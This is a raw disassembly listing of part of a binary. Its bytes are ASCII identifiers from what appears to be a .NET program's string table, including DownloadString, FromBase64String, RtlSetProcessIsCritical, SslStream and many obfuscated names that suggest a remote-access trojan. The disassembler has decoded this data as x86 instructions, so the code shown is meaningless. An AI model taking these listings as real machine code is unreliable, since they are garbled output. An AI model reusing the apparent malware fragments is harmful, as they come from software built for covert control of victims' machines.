  408b6d:	6d                   	insl   (%dx),%es:(%edi)
  408b6e:	2e 44                	cs inc %esp
  408b70:	72 61                	jb     0x408bd3
  408b72:	77 69                	ja     0x408bdd
  408b74:	6e                   	outsb  %ds:(%esi),(%dx)
  408b75:	67 2e 49             	addr16 cs dec %ecx
  408b78:	6d                   	insl   (%dx),%es:(%edi)
  408b79:	61                   	popa
  408b7a:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408b81:	73 
  408b82:	74 65                	je     0x408be9
  408b84:	6d                   	insl   (%dx),%es:(%edi)
  408b85:	2e 52                	cs push %edx
  408b87:	75 6e                	jne    0x408bf7
  408b89:	74 69                	je     0x408bf4
  408b8b:	6d                   	insl   (%dx),%es:(%edi)
  408b8c:	65 2e 56             	gs cs push %esi
  408b8f:	65 72 73             	gs jb  0x408c05
  408b92:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408b99:	46                   	inc    %esi
  408b9a:	72 6f                	jb     0x408c0b
  408b9c:	6d                   	insl   (%dx),%es:(%edi)
  408b9d:	42                   	inc    %edx
  408b9e:	61                   	popa
  408b9f:	73 65                	jae    0x408c06
  408ba1:	36 34 53             	ss xor $0x53,%al
  408ba4:	74 72                	je     0x408c18
  408ba6:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408bad:	61                   	popa
  408bae:	73 65                	jae    0x408c15
  408bb0:	36 34 53             	ss xor $0x53,%al
  408bb3:	74 72                	je     0x408c27
  408bb5:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408bbc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bbd:	6c                   	insb   (%dx),%es:(%edi)
  408bbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408bbf:	61                   	popa
  408bc0:	64 53                	fs push %ebx
  408bc2:	74 72                	je     0x408c36
  408bc4:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408bcb:	74 72                	je     0x408c3f
  408bcd:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408bd4:	5f                   	pop    %edi
  408bd5:	41                   	inc    %ecx
  408bd6:	73 53                	jae    0x408c2b
  408bd8:	74 72                	je     0x408c4c
  408bda:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408be1:	5f                   	pop    %edi
  408be2:	41                   	inc    %ecx
  408be3:	73 53                	jae    0x408c38
  408be5:	74 72                	je     0x408c59
  408be7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408bee:	53                   	push   %ebx
  408bef:	74 72                	je     0x408c63
  408bf1:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408bf8:	73 74                	jae    0x408c6e
  408bfa:	72 69                	jb     0x408c65
  408bfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfd:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408c01:	73 74                	jae    0x408c77
  408c03:	65 6d                	gs insl (%dx),%es:(%edi)
  408c05:	2e 44                	cs inc %esp
  408c07:	72 61                	jb     0x408c6a
  408c09:	77 69                	ja     0x408c74
  408c0b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0c:	67 00 67 65          	add    %ah,0x65(%bx)
  408c10:	74 5f                	je     0x408c71
  408c12:	41                   	inc    %ecx
  408c13:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c17:	61                   	popa
  408c18:	74 65                	je     0x408c7f
  408c1a:	50                   	push   %eax
  408c1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c1c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1d:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c21:	74 5f                	je     0x408c82
  408c23:	41                   	inc    %ecx
  408c24:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c28:	61                   	popa
  408c29:	74 65                	je     0x408c90
  408c2b:	50                   	push   %eax
  408c2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408c2d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c2e:	67 00 70 75          	add    %dh,0x75(%bx,%si)
  408c32:	6c                   	insb   (%dx),%es:(%edi)
  408c33:	66 74 6e             	data16 je 0x408ca4
  408c36:	6d                   	insl   (%dx),%es:(%edi)
  408c37:	77 57                	ja     0x408c90
  408c39:	44                   	inc    %esp
  408c3a:	6c                   	insb   (%dx),%es:(%edi)
  408c3b:	55                   	push   %ebp
  408c3c:	4a                   	dec    %edx
  408c3d:	41                   	inc    %ecx
  408c3e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3f:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c43:	74 5f                	je     0x408ca4
  408c45:	45                   	inc    %ebp
  408c46:	72 72                	jb     0x408cba
  408c48:	6f                   	outsl  %ds:(%esi),(%dx)
  408c49:	72 44                	jb     0x408c8f
  408c4b:	69 61 6c 6f 67 00 72 	imul   $0x7200676f,0x6c(%ecx),%esp
  408c52:	44                   	inc    %esp
  408c53:	4e                   	dec    %esi
  408c54:	58                   	pop    %eax
  408c55:	71 65                	jno    0x408cbc
  408c57:	4b                   	dec    %ebx
  408c58:	7a 4d                	jp     0x408ca7
  408c5a:	79 67                	jns    0x408cc3
  408c5c:	00 54 4c 56          	add    %dl,0x56(%esp,%ecx,2)
  408c60:	48                   	dec    %eax
  408c61:	49                   	dec    %ecx
  408c62:	6c                   	insb   (%dx),%es:(%edi)
  408c63:	5a                   	pop    %edx
  408c64:	49                   	dec    %ecx
  408c65:	51                   	push   %ecx
  408c66:	67 41                	addr16 inc %ecx
  408c68:	68 00 6c 63 44       	push   $0x44636c00
  408c6d:	4f                   	dec    %edi
  408c6e:	7a 49                	jp     0x408cb9
  408c70:	6e                   	outsb  %ds:(%esi),(%dx)
  408c71:	64 56                	fs push %esi
  408c73:	55                   	push   %ebp
  408c74:	6f                   	outsl  %ds:(%esi),(%dx)
  408c75:	46                   	inc    %esi
  408c76:	44                   	inc    %esp
  408c77:	68 00 78 74 69       	push   $0x69747800
  408c7c:	69 51 6b 50 76 4c 6b 	imul   $0x6b4c7650,0x6b(%ecx),%edx
  408c83:	68 00 4a 71 77       	push   $0x77714a00
  408c88:	44                   	inc    %esp
  408c89:	66 7a 6b             	data16 jp 0x408cf7
  408c8c:	6b 65 46 71          	imul   $0x71,0x46(%ebp),%esp
  408c90:	68 00 43 6f 6d       	push   $0x6d6f4300
  408c95:	70 75                	jo     0x408d0c
  408c97:	74 65                	je     0x408cfe
  408c99:	48                   	dec    %eax
  408c9a:	61                   	popa
  408c9b:	73 68                	jae    0x408d05
  408c9d:	00 56 65             	add    %dl,0x65(%esi)
  408ca0:	72 69                	jb     0x408d0b
  408ca2:	66 79 48             	data16 jns 0x408ced
  408ca5:	61                   	popa
  408ca6:	73 68                	jae    0x408d10
  408ca8:	00 46 6c             	add    %al,0x6c(%esi)
  408cab:	75 73                	jne    0x408d20
  408cad:	68 00 67 65 74       	push   $0x74656700
  408cb2:	5f                   	pop    %edi
  408cb3:	45                   	inc    %ebp
  408cb4:	78 65                	js     0x408d1b
  408cb6:	63 75 74             	arpl   %esi,0x74(%ebp)
  408cb9:	61                   	popa
  408cba:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408cbe:	61                   	popa
  408cbf:	74 68                	je     0x408d29
  408cc1:	00 47 65             	add    %al,0x65(%edi)
  408cc4:	74 54                	je     0x408d1a
  408cc6:	65 6d                	gs insl (%dx),%es:(%edi)
  408cc8:	70 50                	jo     0x408d1a
  408cca:	61                   	popa
  408ccb:	74 68                	je     0x408d35
  408ccd:	00 67 65             	add    %ah,0x65(%edi)
  408cd0:	74 5f                	je     0x408d31
  408cd2:	4c                   	dec    %esp
  408cd3:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd5:	67 74 68             	addr16 je 0x408d40
  408cd8:	00 78 55             	add    %bh,0x55(%eax)
  408cdb:	63 6e 46             	arpl   %ebp,0x46(%esi)
  408cde:	43                   	inc    %ebx
  408cdf:	72 72                	jb     0x408d53
  408ce1:	74 68                	je     0x408d4b
  408ce3:	00 72 49             	add    %dh,0x49(%edx)
  408ce6:	4d                   	dec    %ebp
  408ce7:	4a                   	dec    %edx
  408ce8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce9:	7a 4d                	jp     0x408d38
  408ceb:	71 78                	jno    0x408d65
  408ced:	68 00 64 47 42       	push   $0x42476400
  408cf2:	50                   	push   %eax
  408cf3:	58                   	pop    %eax
  408cf4:	50                   	push   %eax
  408cf5:	64 66 6c             	fs data16 insb (%dx),%es:(%edi)
  408cf8:	77 46                	ja     0x408d40
  408cfa:	45                   	inc    %ebp
  408cfb:	42                   	inc    %edx
  408cfc:	43                   	inc    %ebx
  408cfd:	69 00 7a 68 43 63    	imul   $0x6343687a,(%eax),%eax
  408d03:	54                   	push   %esp
  408d04:	6f                   	outsl  %ds:(%esi),(%dx)
  408d05:	68 77 4b 69 00       	push   $0x694b77
  408d0a:	5a                   	pop    %edx
  408d0b:	75 51                	jne    0x408d5e
  408d0d:	75 6c                	jne    0x408d7b
  408d0f:	69 79 68 4e 69 00 6e 	imul   $0x6e00694e,0x68(%ecx),%edi
  408d16:	59                   	pop    %ecx
  408d17:	77 6e                	ja     0x408d87
  408d19:	50                   	push   %eax
  408d1a:	6a 4b                	push   $0x4b
  408d1c:	64 68 65 4b 46 53    	fs push $0x53464b65
  408d22:	65 69 00 68 46 4c 41 	imul   $0x414c4668,%gs:(%eax),%eax
  408d29:	71 4a                	jno    0x408d75
  408d2b:	55                   	push   %ebp
  408d2c:	44                   	inc    %esp
  408d2d:	67 41                	addr16 inc %ecx
  408d2f:	64 71 69             	fs jno 0x408d9b
  408d32:	00 55 72             	add    %dl,0x72(%ebp)
  408d35:	69 00 6b 64 4a 4c    	imul   $0x4c4a646b,(%eax),%eax
  408d3b:	43                   	inc    %ebx
  408d3c:	50                   	push   %eax
  408d3d:	46                   	inc    %esi
  408d3e:	53                   	push   %ebx
  408d3f:	71 76                	jno    0x408db7
  408d41:	6f                   	outsl  %ds:(%esi),(%dx)
  408d42:	68 45 61 76 69       	push   $0x69766145
  408d47:	00 61 66             	add    %ah,0x66(%ecx)
  408d4a:	55                   	push   %ebp
  408d4b:	52                   	push   %edx
  408d4c:	5a                   	pop    %edx
  408d4d:	51                   	push   %ecx
  408d4e:	41                   	inc    %ecx
  408d4f:	45                   	inc    %ebp
  408d50:	6c                   	insb   (%dx),%es:(%edi)
  408d51:	63 76 69             	arpl   %esi,0x69(%esi)
  408d54:	00 4d 63             	add    %cl,0x63(%ebp)
  408d57:	66 6b 4c 44 45 74    	imul   $0x74,0x45(%esp,%eax,2),%cx
  408d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5e:	4a                   	dec    %edx
  408d5f:	6a 00                	push   $0x0
  408d61:	63 43 54             	arpl   %eax,0x54(%ebx)
  408d64:	6a 55                	push   $0x55
  408d66:	78 6d                	js     0x408dd5
  408d68:	4e                   	dec    %esi
  408d69:	72 46                	jb     0x408db1
  408d6b:	79 4e                	jns    0x408dbb
  408d6d:	6a 00                	push   $0x0
  408d6f:	54                   	push   %esp
  408d70:	4c                   	dec    %esp
  408d71:	4d                   	dec    %ebp
  408d72:	42                   	inc    %edx
  408d73:	48                   	dec    %eax
  408d74:	58                   	pop    %eax
  408d75:	61                   	popa
  408d76:	53                   	push   %ebx
  408d77:	61                   	popa
  408d78:	63 57 4f             	arpl   %edx,0x4f(%edi)
  408d7b:	6a 00                	push   $0x0
  408d7d:	51                   	push   %ecx
  408d7e:	69 7a 74 4e 50 4f 65 	imul   $0x654f504e,0x74(%edx),%edi
  408d85:	65 46                	gs inc %esi
  408d87:	59                   	pop    %ecx
  408d88:	69 65 6a 00 41 4b 6f 	imul   $0x6f4b4100,0x6a(%ebp),%esp
  408d8f:	71 52                	jno    0x408de3
  408d91:	68 4a 4d 44 7a       	push   $0x7a444d4a
  408d96:	77 4b                	ja     0x408de3
  408d98:	66 6a 00             	pushw  $0x0
  408d9b:	68 44 6c 4d 42       	push   $0x424d6c44
  408da0:	76 69                	jbe    0x408e0b
  408da2:	57                   	push   %edi
  408da3:	74 42                	je     0x408de7
  408da5:	5a                   	pop    %edx
  408da6:	68 6a 00 6d 48       	push   $0x486d006a
  408dab:	57                   	push   %edi
  408dac:	65 4f                	gs dec %edi
  408dae:	4f                   	dec    %edi
  408daf:	59                   	pop    %ecx
  408db0:	52                   	push   %edx
  408db1:	4b                   	dec    %ebx
  408db2:	56                   	push   %esi
  408db3:	6b 75 6a 00          	imul   $0x0,0x6a(%ebp),%esi
  408db7:	6d                   	insl   (%dx),%es:(%edi)
  408db8:	61                   	popa
  408db9:	69 41 79 58 44 4e 77 	imul   $0x774e4458,0x79(%ecx),%eax
  408dc0:	6a 00                	push   $0x0
  408dc2:	76 50                	jbe    0x408e14
  408dc4:	4d                   	dec    %ebp
  408dc5:	46                   	inc    %esi
  408dc6:	48                   	dec    %eax
  408dc7:	6b 57 53 46          	imul   $0x46,0x53(%edi),%edx
  408dcb:	41                   	inc    %ecx
  408dcc:	6b 00 77             	imul   $0x77,(%eax),%eax
  408dcf:	4a                   	dec    %edx
  408dd0:	66 76 51             	data16 jbe 0x408e24
  408dd3:	59                   	pop    %ecx
  408dd4:	48                   	dec    %eax
  408dd5:	4a                   	dec    %edx
  408dd6:	63 54 4a 63          	arpl   %edx,0x63(%edx,%ecx,2)
  408dda:	6b 00 41             	imul   $0x41,(%eax),%eax
  408ddd:	73 79                	jae    0x408e58
  408ddf:	6e                   	outsb  %ds:(%esi),(%dx)
  408de0:	63 43 61             	arpl   %eax,0x61(%ebx)
  408de3:	6c                   	insb   (%dx),%es:(%edi)
  408de4:	6c                   	insb   (%dx),%es:(%edi)
  408de5:	62 61 63             	bound  %esp,0x63(%ecx)
  408de8:	6b 00 52             	imul   $0x52,(%eax),%eax
  408deb:	65 6d                	gs insl (%dx),%es:(%edi)
  408ded:	6f                   	outsl  %ds:(%esi),(%dx)
  408dee:	74 65                	je     0x408e55
  408df0:	43                   	inc    %ebx
  408df1:	65 72 74             	gs jb  0x408e68
  408df4:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408dfb:	56                   	push   %esi
  408dfc:	61                   	popa
  408dfd:	6c                   	insb   (%dx),%es:(%edi)
  408dfe:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408e05:	43 
  408e06:	61                   	popa
  408e07:	6c                   	insb   (%dx),%es:(%edi)
  408e08:	6c                   	insb   (%dx),%es:(%edi)
  408e09:	62 61 63             	bound  %esp,0x63(%ecx)
  408e0c:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e0f:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e16:	6c                   	insb   (%dx),%es:(%edi)
  408e17:	62 61 63             	bound  %esp,0x63(%ecx)
  408e1a:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e1d:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408e24:	4b 65 
  408e26:	79 50                	jns    0x408e78
  408e28:	65 72 6d             	gs jb  0x408e98
  408e2b:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408e32:	68 65 63 6b 00       	push   $0x6b6365
  408e37:	77 47                	ja     0x408e80
  408e39:	45                   	inc    %ebp
  408e3a:	69 53 69 6c 4c 67 63 	imul   $0x63674c6c,0x69(%ebx),%edx
  408e41:	6b 00 46             	imul   $0x46,(%eax),%eax
  408e44:	6c                   	insb   (%dx),%es:(%edi)
  408e45:	75 73                	jne    0x408eba
  408e47:	68 46 69 6e 61       	push   $0x616e6946
  408e4c:	6c                   	insb   (%dx),%es:(%edi)
  408e4d:	42                   	inc    %edx
  408e4e:	6c                   	insb   (%dx),%es:(%edi)
  408e4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e50:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408e53:	71 68                	jno    0x408ebd
  408e55:	55                   	push   %ebp
  408e56:	4f                   	dec    %edi
  408e57:	56                   	push   %esi
  408e58:	73 44                	jae    0x408e9e
  408e5a:	69 59 59 58 69 6b 00 	imul   $0x6b6958,0x59(%ecx),%ebx
  408e61:	57                   	push   %edi
  408e62:	50                   	push   %eax
  408e63:	54                   	push   %esp
  408e64:	4d                   	dec    %ebp
  408e65:	48                   	dec    %eax
  408e66:	79 72                	jns    0x408eda
  408e68:	5a                   	pop    %edx
  408e69:	75 42                	jne    0x408ead
  408e6b:	6c                   	insb   (%dx),%es:(%edi)
  408e6c:	00 5a 71             	add    %bl,0x71(%edx)
  408e6f:	75 4a                	jne    0x408ebb
  408e71:	55                   	push   %ebp
  408e72:	6d                   	insl   (%dx),%es:(%edi)
  408e73:	55                   	push   %ebp
  408e74:	4b                   	dec    %ebx
  408e75:	48                   	dec    %eax
  408e76:	6c                   	insb   (%dx),%es:(%edi)
  408e77:	00 42 73             	add    %al,0x73(%edx)
  408e7a:	53                   	push   %ebx
  408e7b:	57                   	push   %edi
  408e7c:	74 4b                	je     0x408ec9
  408e7e:	44                   	inc    %esp
  408e7f:	71 55                	jno    0x408ed6
  408e81:	49                   	dec    %ecx
  408e82:	6c                   	insb   (%dx),%es:(%edi)
  408e83:	00 72 5a             	add    %dh,0x5a(%edx)
  408e86:	59                   	pop    %ecx
  408e87:	44                   	inc    %esp
  408e88:	49                   	dec    %ecx
  408e89:	64 4e                	fs dec %esi
  408e8b:	4d                   	dec    %ebp
  408e8c:	4d                   	dec    %ebp
  408e8d:	4d                   	dec    %ebp
  408e8e:	41                   	inc    %ecx
  408e8f:	56                   	push   %esi
  408e90:	6c                   	insb   (%dx),%es:(%edi)
  408e91:	00 52 74             	add    %dl,0x74(%edx)
  408e94:	6c                   	insb   (%dx),%es:(%edi)
  408e95:	53                   	push   %ebx
  408e96:	65 74 50             	gs je  0x408ee9
  408e99:	72 6f                	jb     0x408f0a
  408e9b:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e9e:	73 49                	jae    0x408ee9
  408ea0:	73 43                	jae    0x408ee5
  408ea2:	72 69                	jb     0x408f0d
  408ea4:	74 69                	je     0x408f0f
  408ea6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408ea9:	00 4e 65             	add    %cl,0x65(%esi)
  408eac:	74 77                	je     0x408f25
  408eae:	6f                   	outsl  %ds:(%esi),(%dx)
  408eaf:	72 6b                	jb     0x408f1c
  408eb1:	43                   	inc    %ebx
  408eb2:	72 65                	jb     0x408f19
  408eb4:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408eb7:	74 69                	je     0x408f22
  408eb9:	61                   	popa
  408eba:	6c                   	insb   (%dx),%es:(%edi)
  408ebb:	00 53 79             	add    %dl,0x79(%ebx)
  408ebe:	73 74                	jae    0x408f34
  408ec0:	65 6d                	gs insl (%dx),%es:(%edi)
  408ec2:	2e 53                	cs push %ebx
  408ec4:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408ec8:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408ecf:	6e 
  408ed0:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408ed3:	61                   	popa
  408ed4:	6c                   	insb   (%dx),%es:(%edi)
  408ed5:	00 57 69             	add    %dl,0x69(%edi)
  408ed8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed9:	64 6f                	outsl  %fs:(%esi),(%dx)
  408edb:	77 73                	ja     0x408f50
  408edd:	50                   	push   %eax
  408ede:	72 69                	jb     0x408f49
  408ee0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee1:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408ee4:	61                   	popa
  408ee5:	6c                   	insb   (%dx),%es:(%edi)
  408ee6:	00 67 65             	add    %ah,0x65(%edi)
  408ee9:	74 5f                	je     0x408f4a
  408eeb:	49                   	dec    %ecx
  408eec:	6e                   	outsb  %ds:(%esi),(%dx)
  408eed:	74 65                	je     0x408f54
  408eef:	72 76                	jb     0x408f67
  408ef1:	61                   	popa
  408ef2:	6c                   	insb   (%dx),%es:(%edi)
  408ef3:	00 73 65             	add    %dh,0x65(%ebx)
  408ef6:	74 5f                	je     0x408f57
  408ef8:	49                   	dec    %ecx
  408ef9:	6e                   	outsb  %ds:(%esi),(%dx)
  408efa:	74 65                	je     0x408f61
  408efc:	72 76                	jb     0x408f74
  408efe:	61                   	popa
  408eff:	6c                   	insb   (%dx),%es:(%edi)
  408f00:	00 4b 63             	add    %cl,0x63(%ebx)
  408f03:	55                   	push   %ebp
  408f04:	50                   	push   %eax
  408f05:	79 61                	jns    0x408f68
  408f07:	6b 61 57 65          	imul   $0x65,0x57(%ecx),%esp
  408f0b:	6c                   	insb   (%dx),%es:(%edi)
  408f0c:	00 6b 65             	add    %ch,0x65(%ebx)
  408f0f:	72 6e                	jb     0x408f7f
  408f11:	65 6c                	gs insb (%dx),%es:(%edi)
  408f13:	33 32                	xor    (%edx),%esi
  408f15:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f18:	6c                   	insb   (%dx),%es:(%edi)
  408f19:	00 75 73             	add    %dh,0x73(%ebp)
  408f1c:	65 72 33             	gs jb  0x408f52
  408f1f:	32 2e                	xor    (%esi),%ch
  408f21:	64 6c                	fs insb (%dx),%es:(%edi)
  408f23:	6c                   	insb   (%dx),%es:(%edi)
  408f24:	00 6e 74             	add    %ch,0x74(%esi)
  408f27:	64 6c                	fs insb (%dx),%es:(%edi)
  408f29:	6c                   	insb   (%dx),%es:(%edi)
  408f2a:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f2d:	6c                   	insb   (%dx),%es:(%edi)
  408f2e:	00 4b 69             	add    %cl,0x69(%ebx)
  408f31:	6c                   	insb   (%dx),%es:(%edi)
  408f32:	6c                   	insb   (%dx),%es:(%edi)
  408f33:	00 50 6f             	add    %dl,0x6f(%eax)
  408f36:	6c                   	insb   (%dx),%es:(%edi)
  408f37:	6c                   	insb   (%dx),%es:(%edi)
  408f38:	00 74 5a 66          	add    %dh,0x66(%edx,%ebx,2)
  408f3c:	47                   	inc    %edi
  408f3d:	57                   	push   %edi
  408f3e:	7a 67                	jp     0x408fa7
  408f40:	58                   	pop    %eax
  408f41:	50                   	push   %eax
  408f42:	78 6e                	js     0x408fb2
  408f44:	6c                   	insb   (%dx),%es:(%edi)
  408f45:	00 69 4a             	add    %ch,0x4a(%ecx)
  408f48:	57                   	push   %edi
  408f49:	63 76 56             	arpl   %esi,0x56(%esi)
  408f4c:	68 4e 66 57 6d       	push   $0x6d57664e
  408f51:	00 46 69             	add    %al,0x69(%esi)
  408f54:	6c                   	insb   (%dx),%es:(%edi)
  408f55:	65 53                	gs push %ebx
  408f57:	74 72                	je     0x408fcb
  408f59:	65 61                	gs popa
  408f5b:	6d                   	insl   (%dx),%es:(%edi)
  408f5c:	00 4e 65             	add    %cl,0x65(%esi)
  408f5f:	74 77                	je     0x408fd8
  408f61:	6f                   	outsl  %ds:(%esi),(%dx)
  408f62:	72 6b                	jb     0x408fcf
  408f64:	53                   	push   %ebx
  408f65:	74 72                	je     0x408fd9
  408f67:	65 61                	gs popa
  408f69:	6d                   	insl   (%dx),%es:(%edi)
  408f6a:	00 53 73             	add    %dl,0x73(%ebx)
  408f6d:	6c                   	insb   (%dx),%es:(%edi)
  408f6e:	53                   	push   %ebx
  408f6f:	74 72                	je     0x408fe3
  408f71:	65 61                	gs popa
  408f73:	6d                   	insl   (%dx),%es:(%edi)
  408f74:	00 43 72             	add    %al,0x72(%ebx)
  408f77:	79 70                	jns    0x408fe9
  408f79:	74 6f                	je     0x408fea
  408f7b:	53                   	push   %ebx
  408f7c:	74 72                	je     0x408ff0
  408f7e:	65 61                	gs popa
  408f80:	6d                   	insl   (%dx),%es:(%edi)
  408f81:	00 47 5a             	add    %al,0x5a(%edi)
  408f84:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  408f8b:	6d                   	insl   (%dx),%es:(%edi)
  408f8c:	00 4d 65             	add    %cl,0x65(%ebp)
  408f8f:	6d                   	insl   (%dx),%es:(%edi)
  408f90:	6f                   	outsl  %ds:(%esi),(%dx)
  408f91:	72 79                	jb     0x40900c
  408f93:	53                   	push   %ebx
  408f94:	74 72                	je     0x409008
  408f96:	65 61                	gs popa
  408f98:	6d                   	insl   (%dx),%es:(%edi)
  408f99:	00 54 74 62          	add    %dl,0x62(%esp,%esi,2)
  408f9d:	67 7a 72             	addr16 jp 0x409012
  408fa0:	4f                   	dec    %edi
  408fa1:	6e                   	outsb  %ds:(%esi),(%dx)
  408fa2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa3:	72 44                	jb     0x408fe9
  408fa5:	65 6d                	gs insl (%dx),%es:(%edi)
  408fa7:	00 67 65             	add    %ah,0x65(%edi)
  408faa:	74 5f                	je     0x40900b
  408fac:	49                   	dec    %ecx
  408fad:	74 65                	je     0x409014
  408faf:	6d                   	insl   (%dx),%es:(%edi)
  408fb0:	00 67 65             	add    %ah,0x65(%edi)
  408fb3:	74 5f                	je     0x409014
  408fb5:	49                   	dec    %ecx
  408fb6:	73 36                	jae    0x408fee
  408fb8:	34 42                	xor    $0x42,%al
  408fba:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408fc1:	74 
  408fc2:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408fc9:	65 6d                	gs insl (%dx),%es:(%edi)
  408fcb:	00 53 79             	add    %dl,0x79(%ebx)
  408fce:	6d                   	insl   (%dx),%es:(%edi)
  408fcf:	6d                   	insl   (%dx),%es:(%edi)
  408fd0:	65 74 72             	gs je  0x409045
  408fd3:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408fda:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408fe1:	79 
  408fe2:	6d                   	insl   (%dx),%es:(%edi)
  408fe3:	6d                   	insl   (%dx),%es:(%edi)
  408fe4:	65 74 72             	gs je  0x409059
  408fe7:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408fee:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408ff5:	73 
  408ff6:	68 41 6c 67 6f       	push   $0x6f676c41
  408ffb:	72 69                	jb     0x409066
  408ffd:	74 68                	je     0x409067
  408fff:	6d                   	insl   (%dx),%es:(%edi)
  409000:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  409004:	6d                   	insl   (%dx),%es:(%edi)
  409005:	00 70 4d             	add    %dh,0x4d(%eax)
  409008:	5a                   	pop    %edx
  409009:	47                   	inc    %edi
  40900a:	56                   	push   %esi
  40900b:	6a 66                	push   $0x66
  40900d:	73 64                	jae    0x409073
  40900f:	6e                   	outsb  %ds:(%esi),(%dx)
  409010:	6e                   	outsb  %ds:(%esi),(%dx)
  409011:	6d                   	insl   (%dx),%es:(%edi)
  409012:	00 65 66             	add    %ah,0x66(%ebp)
  409015:	65 58                	gs pop %eax
  409017:	74 76                	je     0x40908f
  409019:	49                   	dec    %ecx
  40901a:	62 48 72             	bound  %ecx,0x72(%eax)
  40901d:	45                   	inc    %ebp
  40901e:	6f                   	outsl  %ds:(%esi),(%dx)
  40901f:	6d                   	insl   (%dx),%es:(%edi)
  409020:	00 64 6f 59          	add    %ah,0x59(%edi,%ebp,2)
  409024:	70 6c                	jo     0x409092
  409026:	62 69 69             	bound  %ebp,0x69(%ecx)
  409029:	48                   	dec    %eax
  40902a:	52                   	push   %edx
  40902b:	56                   	push   %esi
  40902c:	6f                   	outsl  %ds:(%esi),(%dx)
  40902d:	6d                   	insl   (%dx),%es:(%edi)
  40902e:	00 52 61             	add    %dl,0x61(%edx)
  409031:	6e                   	outsb  %ds:(%esi),(%dx)
  409032:	64 6f                	outsl  %fs:(%esi),(%dx)
  409034:	6d                   	insl   (%dx),%es:(%edi)
  409035:	00 49 43             	add    %cl,0x43(%ecx)
  409038:	72 79                	jb     0x4090b3
  40903a:	70 74                	jo     0x4090b0
  40903c:	6f                   	outsl  %ds:(%esi),(%dx)
  40903d:	54                   	push   %esp
  40903e:	72 61                	jb     0x4090a1
  409040:	6e                   	outsb  %ds:(%esi),(%dx)
  409041:	73 66                	jae    0x4090a9
  409043:	6f                   	outsl  %ds:(%esi),(%dx)
  409044:	72 6d                	jb     0x4090b3
  409046:	00 45 6e             	add    %al,0x6e(%ebp)
  409049:	75 6d                	jne    0x4090b8
  40904b:	00 41 75             	add    %al,0x75(%ecx)
  40904e:	6b 71 61 63          	imul   $0x63,0x61(%ecx),%esi
  409052:	58                   	pop    %eax
  409053:	73 5a                	jae    0x4090af
  409055:	64 59                	fs pop %ecx
  409057:	46                   	inc    %esi
  409058:	6e                   	outsb  %ds:(%esi),(%dx)
  409059:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40905d:	6f                   	outsl  %ds:(%esi),(%dx)
  40905e:	6f                   	outsl  %ds:(%esi),(%dx)
  40905f:	6c                   	insb   (%dx),%es:(%edi)
  409060:	65 61                	gs popa
  409062:	6e                   	outsb  %ds:(%esi),(%dx)
  409063:	00 68 64             	add    %ch,0x64(%eax)
  409066:	47                   	inc    %edi
  409067:	6d                   	insl   (%dx),%es:(%edi)
  409068:	67 46                	addr16 inc %esi
  40906a:	54                   	push   %esp
  40906b:	54                   	push   %esp
